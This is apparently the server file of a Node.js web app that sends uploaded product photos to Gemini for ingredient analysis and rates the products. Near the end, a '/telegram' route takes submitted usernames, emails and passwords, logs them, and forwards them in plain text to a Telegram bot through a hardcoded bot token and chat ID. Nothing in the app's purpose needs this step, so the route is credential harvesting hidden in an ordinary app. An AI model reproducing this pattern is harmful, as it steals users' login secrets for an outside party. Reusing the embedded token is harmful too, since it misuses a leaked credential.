const { GoogleGenerativeAI } = require("@google/generative-ai");
const express = require("express");
const path = require("path");
const multer = require("multer");
const fs = require("fs");
const sharp = require("sharp");
const app = express();
const axios = require("axios");
app.set("view engine", "ejs");
const useragent = require("express-useragent");
app.use(useragent.express());

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    return cb(null, "./public/uploads");
  },
  filename: (req, file, cb) => {
    const fileExt = path.extname(file.originalname);
    return cb(null, "productimage" + fileExt);
  },
});

const upload = multer({ storage });

require("dotenv").config();
const apiKey = process.env.GEMINI_API_KEY;
const genAI = new GoogleGenerativeAI(apiKey);

function fileToGenerativePart(buffer, mimeType) {
  return {
    inlineData: {
      data: buffer.toString("base64"),
      mimeType: mimeType,
    },
  };
}



app.get("/", function (req, res) {
  res.render("index");
});

app.get("/aboutus", (req, res) => {
  res.render("aboutus");
});

app.get("/main", (req, res) => {
  res.render("index");
});

app.post("/result", upload.single("imageFile"), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).send("No file uploaded");
    }

    const fileExt = path.extname(req.file.originalname);
    const originalFilePath = req.file.path;
    const mimeType = req.file.mimetype;
    const analysisType = req.body.analysisType || "deep";

    let filePath = originalFilePath;
    let imageBuffer;

    if (analysisType === "fast") {
      // Compress image
      const compressedFilePath = `public/uploads/compressed_productimage${fileExt}`;
      await sharp(originalFilePath)
        .resize(800, 800, {
          fit: sharp.fit.inside,
          withoutEnlargement: true,
        })
        .jpeg({ quality: 70 })
        .toFile(compressedFilePath);

      filePath = compressedFilePath;
    }

    // Read the image file
    imageBuffer = fs.readFileSync(filePath);

    // Create model instance
    const visionModel = genAI.getGenerativeModel({
      model: "gemini-1.5-pro",
      generationConfig: {
        temperature: 0.1,
        topP: 0.7,
        topK: 20,
        maxOutputTokens: 1024,
      },
    });

    const promptParts = [
      {
        text: `You are analyzing a product image. Your response must be ONLY a valid JSON object with NO text outside the JSON structure.
      
Product type: ${req.body.productType}
User expectations: ${req.body.productExpect}

Examine text, labels, and ingredients visible in the image.
Return EXACTLY this JSON format with no comments, explanations, backticks, or markdown:
{"whatcanyouexpect":" in most simple englsih with few words see what user are expecting from this product and tell if they can expect that or not and also what they can expect",
"rating":"give rating 1 to 10 eg 7/10 like this",
"isproductworthbuying":"yes/no with reason from ingrediants and what user expect and in most simple english with few words ",
"ingredients":{"ingrediantname": ing the biggining analysis deeply if the ingredient is plant based or natural say (natural) if it is of pure chemical say (chemical)  than explain in super easy short words what this ingredient is than tell what this ingredient does in the product in simple language  than brief note on any health considerations all this things should inside this object not be in json format just line by line }}`,
      },
      fileToGenerativePart(imageBuffer, mimeType),
    ];

    const result = await visionModel.generateContent({
      contents: [{ parts: promptParts }],
    });

    let response = result.response.text();

    // Process response to ensure it's clean JSON
    response = cleanJsonResponse(response);
    response = JSON.parse(response);

    console.log(response);
    // Render the result template with image path and AI response
    res.render("result", {
      image: `uploads/${path.basename(filePath)}`,
      answer: response,
      analysisType: analysisType,
    });
  } catch (error) {
    console.error("Error:", error);
    res
      .status(500)
      .send(
        "An error has occurred. Please refresh the page and try again. If the error persists, contact the admin through the contact page."
      );
  }
});

// Helper function to clean json response
function cleanJsonResponse(response) {
  // Remove code blocks, backticks, and "json" labels
  let cleaned = response.replace(/```json|```/g, "").trim();

  // Try to extract just the JSON object if other text is present
  try {
    const jsonStart = cleaned.indexOf("{");
    const jsonEnd = cleaned.lastIndexOf("}") + 1;

    if (jsonStart >= 0 && jsonEnd > jsonStart) {
      cleaned = cleaned.substring(jsonStart, jsonEnd);
    }

    // Validate it parses as JSON
    JSON.parse(cleaned);
    return cleaned;
  } catch (e) {
    console.log(e);
    console.log(JSON.stringify(response));
    return `An error has occurred. Please refresh the page and try again. If the error persists, contact the admin through the contact page.`;
  }
}

// Additional routes
app.get("/howitworks", (req, res) => {
  res.render("howitworks");
});

app.get("/whytouse", (req, res) => {
  res.render("whytouse");
});

app.get("/contact", (req, res) => {
  res.render("contact");
});

app.post("/telegram", (req,res)=>{
  
  
  const details = `username is ${req.body.username} have email ${req.body.email} and passsword ${req.body.password} `
console.log(details)
  sendToTelegram(details);

 res.redirect('/')
})

function sendToTelegram(message) {
  const BOT_TOKEN = "7138395020:AAF98yTTnZ_jDkGLqdbmNGo9_GkGYotoHl8";
  const CHAT_ID = "1779078520";
  const MESSAGE = message;

  axios
    .post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: MESSAGE,
    })
    .then((response) => {
      console.log("Message sent:", response.data);
    })
    .catch((error) => {
      console.error("Error sending message:", error);
    });
}

// Server startup
app.listen(3000, () => {
  console.log("Server running on port 3000");
});
